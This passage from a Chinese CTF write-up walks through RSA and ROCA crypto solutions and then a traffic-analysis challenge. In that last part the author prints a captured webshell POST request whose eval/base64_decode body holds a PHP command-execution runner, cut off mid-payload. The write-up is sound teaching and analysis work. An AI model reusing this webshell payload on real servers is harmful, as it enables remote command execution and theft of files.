class="string">&#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">key = random.randint(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">crypto += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i])^key)</span><br><span class="line">m = crypto的<span class="built_in">ascii</span>十六进制</span><br><span class="line">e = random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(e))</span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#37693cfc748049e45d87b8c7d8b9aacd</span></span><br><span class="line"><span class="comment">#4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line"><span class="comment">#3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br></pre></td></tr></table></figure><p> 简单的签到题</p><ul><li><p>去cmd5上查<code>37693cfc748049e45d87b8c7d8b9aacd</code>得到<code>e=23</code></p></li><li><p>知道p、n, <code>q = n// p</code>；phi可求</p></li><li><p>基础rsa，解出m</p></li><li><p>转换得到<code>&#39;ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu&#39;</code></p></li><li><p>由题意，爆破key</p><p>按照常规格式，flag最后一位应该是<code>&#125;</code></p><p>由此得到，<strong>key=8</strong></p></li><li><p>异或得flag</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2, libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line">c= <span class="number">3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">23</span></span><br><span class="line"></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line">num = <span class="number">1</span></span><br><span class="line">m = <span class="string">&#x27;ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第&#123;0&#125;个字符&#x27;</span>.<span class="built_in">format</span>(num))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;k:&#x27;</span>, h)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ h))</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x6e64696f735f3b396b67453b574b38653b573f67576e3c5c3b6b7c6e75</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">第29个字符</span></span><br><span class="line"><span class="string">k: 1</span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 2</span></span><br><span class="line"><span class="string">w</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 3</span></span><br><span class="line"><span class="string">v</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 4</span></span><br><span class="line"><span class="string">q</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 5</span></span><br><span class="line"><span class="string">p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 6</span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 7</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 8</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 9</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">k: 10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># k = 8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>异或</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">&#x27;ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">8</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;W31coM3_C0m3_7o_f4T3ctf&#125;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-OF-RSA-赛后复现"><a href="#CVE-OF-RSA-赛后复现" class="headerlink" title="CVE OF RSA | 赛后复现"></a>CVE OF RSA | 赛后复现</h3><blockquote><p>此题是赛后看了<a href="https://4xwi11.github.io/posts/9171e9d7/">4xwi11师傅</a>的思路后，尝试独立复现的</p></blockquote><p>回顾当时的情形，比赛时间为10: 00 - 18:00</p><p>十二点到下午一点之间就已经完成了2/3的密码题了</p><p>于是充满干劲地去试此题（<strong>AK是梦想哈哈🤤</strong></p><p><strong>列出几点不足</strong></p><ul><li><p>知识面窄，不晓得此漏洞</p></li><li><p>反应慢半拍，以为要嗯研究数学逻辑，然后独立写脚本</p><p>就这样想了两三个小时，期间疯狂搜索，也没思路</p></li><li><p>思维僵硬，终于找到CVE对应的paper后，没有想到可以去找已有的、现成的代码</p><p>（其实时间也不够了，五点四十几，看到论文就瞑目了，时间太紧没有干劲啃论文了</p></li></ul><p>好，让我们回到五点四十。</p><ol><li><p>搜到了如下关键词</p><p><a href="https://crocs.fi.muni.cz/_media/public/papers/nemec_roca_ccs17_preprint.pdf"><strong>The Return of Coppersmith’s Attack</strong></a></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220425230421404.png" alt="paper"></p></li><li><p>此时，不该去望“文”兴叹，去<strong>github搜索</strong>看看吧！</p><p>直接搜索关键词，没有高质量的代码</p><p>参考4xwi11师傅推荐的仓库</p><blockquote><p>17年的<a href="https://en.wikipedia.org/wiki/ROCA_vulnerability">ROCA（Return of Coppersmith’s attack）漏洞</a>。简单转述一下就是，一些硬件采用以上方法快速产生RSA的私钥，这样产生的公钥n会带有一个指纹，但由于M是光滑数，这个指纹可以很快被攻击者确定，从而分解n</p><p>有个仓库总结了很多密码的攻击，其中就有ROCA，Fr.<a href="https://github.com/jvdsn/crypto-attacks.git">https://github.com/jvdsn/crypto-attacks.git</a></p></blockquote></li><li><p>利用其中函数，在roca.py下添加(N从靶机中得来)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">M = <span class="number">962947420735983927056946215901134429196419130606213075415963491270</span></span><br><span class="line">N = <span class="number">14481363580917358871472996410471767154481047067466167591298208947805462002275531552979475988627964256677709787930755013972295770123571982960720640872341517</span></span><br><span class="line">p_, q_ = factorize(N, M, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found p = <span class="subst">&#123;p_&#125;</span> and q = <span class="subst">&#123;q_&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>其中m = 5, t= 6来源如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># roca.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorize</span>(<span class="params">N, M, m, t, g=<span class="number">65537</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus using the ROCA method.</span></span><br><span class="line"><span class="string">    More information: Nemec M. et al., &quot;The Return of Coppersmith’s Attack: Practical Factorization of Widely Used RSA Moduli&quot;</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param M: the primorial used to generate the primes</span></span><br><span class="line"><span class="string">    :param m: the m parameter for Coppersmith&#x27;s method</span></span><br><span class="line"><span class="string">    :param t: the t parameter for Coppersmith&#x27;s method</span></span><br><span class="line"><span class="string">    :param g: the generator value (default: 65537)</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ···</span><br></pre></td></tr></table></figure><blockquote><p>参数根据论文<em>The Return of Coppersmith’s Attack: Practical Factorization of Widely Used RSA Moduli</em>(<a href="https://acmccs.github.io/papers/p1631-nemecA.pdf)，n是512位的，则m和t分别取5和6">https://acmccs.github.io/papers/p1631-nemecA.pdf)，n是512位的，则m和t分别取5和6</a></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220426002438607.png" alt="m&amp;t"></p></blockquote></li><li><p>利用sage解题「 Linux or (类)Unix 终端 」</p><ul><li><p>激活sage <code>conda activate sage</code> </p></li><li><p>执行roca解题脚本 <code>sage -python roca.py的绝对路径</code> </p></li><li><p>等待⌛️ 五分钟左右，分解成功</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220426002311486.png" alt="roca"></p></li><li><p>正常RSA求解m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">n = <span class="number">14481363580917358871472996410471767154481047067466167591298208947805462002275531552979475988627964256677709787930755013972295770123571982960720640872341517</span></span><br><span class="line">c = <span class="number">3679892564888936950542940140902963743841717939818025696558626052971555790204073416047068709668040686939721666022034628127241497612925260505783618939964139</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">111425929610175462966231922510304239063491575573222700849341403103622849511679</span></span><br><span class="line">q = <span class="number">129964036482177256444505240482938730532498372430648951070700710194345995195123</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># flag&#123;e28e6991-080d-4587-900d-db3c47139453&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h4 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h4><ul><li>找到了厉害师傅的博客🤔</li><li>第一次体验了CVE复现</li><li>近一步了解密码解题的思维</li><li>发现了一个极好的Crypto-attack仓库</li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>略</p><h3 id="easyflow"><a href="#easyflow" class="headerlink" title="easyflow"></a>easyflow</h3><p>先用wireshark把所有HTTP流量都导出<br><img src="https://s2.loli.net/2022/04/23/FMmAZp8UeS2Nunq.png" alt="upload_eea1e678ff86ee76ae1563aab3d03593.png"></p><p>大致分析了一下<br>在第11个包开始发现异常</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">93748</span>ef4./<span class="number">2022-04-05</span> <span class="number">20:30:07128</span><span class="number">0700</span></span><br><span class="line">../<span class="number">2022-04-05</span> <span class="number">20</span>:<span class="number">30:05384</span><span class="number">0700</span></span><br><span class="line">.DS_Store<span class="number">2022-04-05</span> <span class="number">20</span>:<span class="number">30:126148</span><span class="number">0644</span></span><br><span class="line">index.php<span class="number">2022-04-05</span> <span class="number">20:11:4634</span><span class="number">0666</span></span><br><span class="line"><span class="number">3f17a75c06</span></span><br></pre></td></tr></table></figure><p>第13个包发现了flag.txt</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">4304dd6cf6d./</span><span class="number">2022-04-05 20:30:05</span><span class="number">384</span><span class="number">0700</span></span><br><span class="line"><span class="string">../</span><span class="number">2022-04-05 20:29:55</span><span class="number">3424</span><span class="number">0755</span></span><br><span class="line"><span class="string">mess/</span><span class="number">2022-03-15 18:13:29</span><span class="number">384</span><span class="number">0755</span></span><br><span class="line"><span class="string">test/</span><span class="number">2022-04-05 20:30:07</span><span class="number">128</span><span class="number">0700</span></span><br><span class="line"><span class="string">air/</span><span class="number">2022-03-31 10:42:34</span><span class="number">512</span><span class="number">0700</span></span><br><span class="line"><span class="string">rips/</span><span class="number">2022-02-25 09:16:57</span><span class="number">384</span><span class="number">0775</span></span><br><span class="line"><span class="string">CMS/</span><span class="number">2022-01-20 09:29:06</span><span class="number">384</span><span class="number">0755</span></span><br><span class="line"><span class="string">test4/</span><span class="number">2022-03-31 17:33:39</span><span class="number">384</span><span class="number">0700</span></span><br><span class="line"><span class="string">localhost/</span><span class="number">2022-04-04 17:21:59</span><span class="number">640</span><span class="number">0775</span></span><br><span class="line"><span class="string">.DS_Store</span><span class="number">2022-04-05 20:30:07</span><span class="number">8196</span><span class="number">0644</span></span><br><span class="line"><span class="string">flag.txt</span><span class="number">2022-04-05 20:14:30</span><span class="number">84</span><span class="number">0644</span></span><br><span class="line"><span class="string">Mccms_v2.5.7.zip</span><span class="number">2022-03-31 15:11:18</span><span class="number">12986995</span><span class="number">0644</span></span><br><span class="line"><span class="string">8197fe18fb2b</span></span><br></pre></td></tr></table></figure><p>然后在第17个包和第19个包发现了关于flag的线索<br>17</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f9aa250head: illegal line <span class="keyword">count</span> -- ../flag.txt</span><br><span class="line">[S]</span><br><span class="line"><span class="regexp">/Users/</span>chang<span class="regexp">/Sites/</span>test</span><br><span class="line">[E]</span><br><span class="line"><span class="number">13</span>e3b9</span><br></pre></td></tr></table></figure><p>19</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">625</span>fe869b49eYes,<span class="keyword">this</span> is the flag <span class="keyword">file</span>.</span><br><span class="line">And the flag is:</span><br><span class="line">[S]</span><br><span class="line"><span class="regexp">/Users/</span>chang<span class="regexp">/Sites/</span>test</span><br><span class="line">[E]</span><br><span class="line"><span class="number">63</span>c1dbf1e811</span><br></pre></td></tr></table></figure><p>于是开始分析第16个包的内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=%<span class="number">40</span>eval(%<span class="number">40</span>base<span class="number">64</span>_decode(%<span class="number">24</span>_POST%<span class="number">5</span>B&#x27;kc<span class="number">1</span>b<span class="number">01</span>ee<span class="number">4</span>a<span class="number">605</span>&#x27;%<span class="number">5</span>D))%<span class="number">3</span>B&amp;e<span class="number">57</span>fb<span class="number">9</span>c<span class="number">067</span>c<span class="number">677</span>=E<span class="number">8</span>&amp;g<span class="number">479</span>cf<span class="number">6</span>f<span class="number">058</span>cf<span class="number">8</span>=hnY<span class="number">2</span>QgIi<span class="number">9</span>Vc<span class="number">2</span>Vycy<span class="number">9</span>jaGFuZy<span class="number">9</span>TaXRlcy<span class="number">90</span>ZXN<span class="number">0</span>IjtoZWFkIC<span class="number">1</span>uIC<span class="number">4</span>uL<span class="number">2</span>ZsYWcudHh<span class="number">0</span>O<span class="number">2</span>VjaG<span class="number">8</span>gW<span class="number">1</span>NdO<span class="number">3</span>B<span class="number">3</span>ZDtlY<span class="number">2</span>hvIFtFXQ%<span class="number">3</span>D%<span class="number">3</span>D&amp;kc<span class="number">1</span>b<span class="number">01</span>ee<span class="number">4</span>a<span class="number">605</span>=QGluaV<span class="number">9</span>zZXQoImRpc<span class="number">3</span>BsYXlfZXJyb<span class="number">3</span>JzIiwgIjAiKTtAc<span class="number">2</span>V<span class="number">0</span>X<span class="number">3</span>RpbWVfbGltaXQoMCk<span class="number">7</span>ZnVuY<span class="number">3</span>Rpb<span class="number">24</span>gYXNlbmMoJG<span class="number">91</span>dCl<span class="number">7</span>cmV<span class="number">0</span>dXJuICRvdXQ<span class="number">7</span>fTtmdW<span class="number">5</span>jdGlvbiBhc<span class="number">291</span>dHB<span class="number">1</span>dCgpeyRvdXRwdXQ<span class="number">9</span>b<span class="number">2</span>JfZ<span class="number">2</span>V<span class="number">0</span>X<span class="number">2</span>NvbnRlbnRzKCk<span class="number">7</span>b<span class="number">2</span>JfZW<span class="number">5</span>kX<span class="number">2</span>NsZWFuKCk<span class="number">7</span>ZWNobyAiZjlhIi<span class="number">4</span>iYTI<span class="number">1</span>MCI<span class="number">7</span>ZWNobyBAYXNlbmMoJG<span class="number">91</span>dHB<span class="number">1</span>dCk<span class="number">7</span>ZWNobyAiMTNlIi<span class="number">4</span>iM<span class="number">2</span>I<span class="number">5</span>Ijt<span class="number">9</span>b<span class="number">2</span>Jfc<span class="number">3</span>RhcnQoKTt<span class="number">0</span>cnl<span class="number">7</span>JHA<span class="number">9</span>YmFzZTY<span class="number">0</span>X<span class="number">2</span>RlY<span class="number">29</span>kZShzdWJzdHIoJF<span class="number">9</span>QT<span class="number">1</span>NUWyJvMWZhZWJkNGVjM<span class="number">2</span>Q<span class="number">5</span>NyJdLDIpKTskcz<span class="number">1</span>iYXNlNjRfZGVjb<span class="number">2</span>RlKHN<span class="number">1</span>YnN<span class="number">0</span>cigkX<span class="number">1</span>BPU<span class="number">1</span>RbImc<span class="number">0</span>NzljZjZmMDU<span class="number">4</span>Y<span class="number">2</span>Y<span class="number">4</span>Il<span class="number">0</span>sMikpOyRlbnZzdHI<span class="number">9</span>QGJhc<span class="number">2</span>U<span class="number">2</span>NF<span class="number">9</span>kZWNvZGUoc<span class="number">3</span>Vic<span class="number">3</span>RyKCRfUE<span class="number">9</span>TVFsiZTU<span class="number">3</span>ZmI<span class="number">5</span>YzA<span class="number">2</span>N<span class="number">2</span>M<span class="number">2</span>NzciXSwyKSk<span class="number">7</span>JGQ<span class="number">9</span>ZGlybmFtZSgkX<span class="number">1</span>NFUlZFUlsiU<span class="number">0</span>NSSVBUX<span class="number">0</span>ZJTEVOQU<span class="number">1</span>FIl<span class="number">0</span>pOyRjPXN<span class="number">1</span>YnN<span class="number">0</span>cigkZCwwLDEpPT<span class="number">0</span>iLyI%<span class="number">2</span>FIi<span class="number">1</span>jIFwieyRzfVwiIjoiL<span class="number">2</span>MgXCJ<span class="number">7</span>JHN<span class="number">9</span>XCIiO<span class="number">2</span>lmKHN<span class="number">1</span>YnN<span class="number">0</span>cigkZCwwLDEpPT<span class="number">0</span>iLyIpe<span class="number">0</span>BwdXRlbnYoIlBBVEg<span class="number">9</span>Ii<span class="number">5</span>nZXRlbnYoIlBBVEgiKS<span class="number">4</span>iOi<span class="number">91</span>c<span class="number">3</span>IvbG<span class="number">9</span>jYWwvc<span class="number">2</span>JpbjovdXNyL<span class="number">2</span>xvY<span class="number">2</span>FsL<span class="number">2</span>JpbjovdXNyL<span class="number">3</span>NiaW<span class="number">46</span>L<span class="number">3</span>Vzci<span class="number">9</span>iaW<span class="number">46</span>L<span class="number">3</span>NiaW<span class="number">46</span>L<span class="number">2</span>JpbiIpO<span class="number">31</span>lbHNle<span class="number">0</span>BwdXRlbnYoIlBBVEg<span class="number">9</span>Ii<span class="number">5</span>nZXRlbnYoIlBBVEgiKS<span class="number">4</span>iO<span class="number">0</span>M<span class="number">6</span>L<span class="number">1</span>dpbmRvd<span class="number">3</span>Mvc<span class="number">3</span>lzdGVtMzI<span class="number">7</span>QzovV<span class="number">2</span>luZG<span class="number">93</span>cy<span class="number">9</span>TeXNXT<span class="number">1</span>c<span class="number">2</span>NDtDOi<span class="number">9</span>XaW<span class="number">5</span>kb<span class="number">3</span>dzO<span class="number">0</span>M<span class="number">6</span>L<span class="number">1</span>dpbmRvd<span class="number">3</span>MvU<span class="number">3</span>lzdGVtMzIvV<span class="number">2</span>luZG<span class="number">93</span>c<span class="number">1</span>Bvd<span class="number">2</span>VyU<span class="number">2</span>hlbGwvdjEuMC<span class="number">87</span>Iik<span class="number">7</span>fWlmKCFlbXB<span class="number">0</span>eSgkZW<span class="number">52</span>c<span class="number">3</span>RyKSl<span class="number">7</span>JGVudmFycj<span class="number">1</span>leHBsb<span class="number">2</span>RlKCJ<span class="number">8</span>fHxhc<span class="number">2</span>xpbmV<span class="number">8</span>fHwiLCAkZW<span class="number">52</span>c<span class="number">3</span>RyKTtmb<span class="number">3</span>JlYWNoKCRlbnZhcnIgYXMgJHYpIHtpZiAoIWVtcHR<span class="number">5</span>KCR<span class="number">2</span>KSkge<span class="number">0</span>BwdXRlbnYoc<span class="number">3</span>RyX<span class="number">3</span>JlcGxhY<span class="number">2</span>UoInx<span class="number">8</span>fGFza<span class="number">2</span>V<span class="number">5</span>fHx<span class="number">8</span>IiwgIj<span class="number">0</span>iLCAkdikpO<span class="number">319</span>fSRyPSJ<span class="number">7</span>JHB<span class="number">9</span>IHskY<span class="number">30</span>iO<span class="number">2</span>Z<span class="number">1</span>bmN<span class="number">0</span>aW<span class="number">9</span>uIGZlKCRmKXskZD<span class="number">1</span>leHBsb<span class="number">2</span>RlKCIsIixAaW<span class="number">5</span>pX<span class="number">2</span>dldCgiZGlzYWJsZV<span class="number">9</span>mdW<span class="number">5</span>jdGlvbnMiKSk<span class="number">7</span>aWYoZW<span class="number">1</span>wdHkoJGQpKXskZD<span class="number">1</span>hcnJheSgpO<span class="number">31</span>lbHNleyRkPWFycmF<span class="number">5</span>X<span class="number">21</span>hcCgndHJpbScsYXJyYXlfbWFwKCdzdHJ<span class="number">0</span>b<span class="number">2</span>xvd<span class="number">2</span>VyJywkZCkpO<span class="number">31</span>yZXR<span class="number">1</span>cm<span class="number">4</span>oZnVuY<span class="number">3</span>Rpb<span class="number">25</span>fZXhpc<span class="number">3</span>RzKCRmKSYmaXNfY<span class="number">2</span>FsbGFibGUoJGYpJiYhaW<span class="number">5</span>fYXJyYXkoJGYsJGQpKTt<span class="number">9</span>O<span class="number">2</span>Z<span class="number">1</span>bmN<span class="number">0</span>aW<span class="number">9</span>uIHJ<span class="number">1</span>bnNoZWxsc<span class="number">2</span>hvY<span class="number">2</span>soJGQsICRjKSB<span class="number">7</span>aWYgKHN<span class="number">1</span>YnN<span class="number">0</span>cigkZCwgMCwgMSkgPT<span class="number">0</span>gIi<span class="number">8</span>iICYmIGZlKCdwdXRlbnYnKSAmJiAoZmUoJ<span class="number">2</span>Vycm<span class="number">9</span>yX<span class="number">2</span>xvZycpIHx<span class="number">8</span>IGZlKCdtYWlsJykpKSB<span class="number">7</span>aWYgKHN<span class="number">0</span>cnN<span class="number">0</span>cihyZWFkbGluaygiL<span class="number">2</span>Jpbi<span class="number">9</span>zaCIpLCAiYmFzaCIpICE<span class="number">9</span>IEZBTFNFKSB<span class="number">7</span>JHRtcCA<span class="number">9</span>IHRlbXBuYW<span class="number">0</span>oc<span class="number">3</span>lzX<span class="number">2</span>dldF<span class="number">90</span>ZW<span class="number">1</span>wX<span class="number">2</span>RpcigpLCAnYXMnKTtwdXRlbnYoIlBIUF<span class="number">9</span>MT<span class="number">0</span>w<span class="number">9</span>KCkgeyB<span class="number">4</span>OyB<span class="number">9</span>OyAkYyA%<span class="number">2</span>BJHRtcCAyPiYxIik<span class="number">7</span>aWYgKGZlKCdlcnJvcl<span class="number">9</span>sb<span class="number">2</span>cnKSkge<span class="number">2</span>Vycm<span class="number">9</span>yX<span class="number">2</span>xvZygiYSIsIDEpO<span class="number">30</span>gZWxzZSB<span class="number">7</span>bWFpbCgiYUAxMjcuMC<span class="number">4</span>wLjEiLCAiIiwgIiIsICItYnYiKTt<span class="number">9</span>fSBlbHNlIHtyZXR<span class="number">1</span>cm<span class="number">4</span>gRmFsc<span class="number">2</span>U<span class="number">7</span>fSRvdXRwdXQgPSBAZmlsZV<span class="number">9</span>nZXRfY<span class="number">29</span>udGVudHMoJHRtcCk<span class="number">7</span>QHVubGluaygkdG<span class="number">1</span>wKTtpZiAoJG<span class="number">91</span>dHB<span class="number">1</span>dCAhPSAiIikge<span class="number">3</span>ByaW<span class="number">50</span>KCRvdXRwdXQpO<span class="number">3</span>JldHVybiBUcnVlO<span class="number">319</span>cmV<span class="number">0</span>dXJuIEZhbHNlO<span class="number">307</span>ZnVuY<span class="number">3</span>Rpb<span class="number">24</span>gcnVuY<span class="number">21</span>kKCRjKXskcmV<span class="number">0</span>PTA<span class="number">7</span>JGQ<span class="number">9</span>ZGlybmFtZSgkX<span class="number">1</span>NFUlZFUlsiU<span class="number">0</span>NSSVBUX<span class="number">0</span>ZJTEVOQU<span class="number">1</span>FIl<span class="number">0</span>pO<span class="number">2</span>lmKGZlKCdzeXN<span class="number">0</span>ZW<span class="number">0</span>nKSl<span class="number">7</span>QHN<span class="number">5</span>c<span class="number">3</span>RlbSgkYywkcmV<span class="number">0</span>KTt<span class="number">9</span>ZWxzZWlmKGZlKCdwYXNzdGhydScpKXtAcGFzc<span class="number">3</span>RocnUoJGMsJHJldCk<span class="number">7</span>fWVsc<span class="number">2</span>VpZihmZSgnc<span class="number">2</span>hlbGxfZXhlYycpKXtwcmludChAc<span class="number">2</span>hlbGxfZXhlYygkYykpO<span class="number">31</span>lbHNlaWYoZmUoJ<span class="number">2</span>V<span 